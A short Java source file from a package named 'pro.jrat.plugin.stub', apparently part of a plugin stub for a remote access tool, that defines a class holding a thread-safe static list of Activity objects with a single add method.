package pro.jrat.plugin.stub;

import java.util.ArrayList;
import java.util.List;

public class Activities {

	public static final List<Activity> activities = new ArrayList<Activity>();

	public static synchronized void add(Activity activity) {
		activities.add(activity);
	}
}
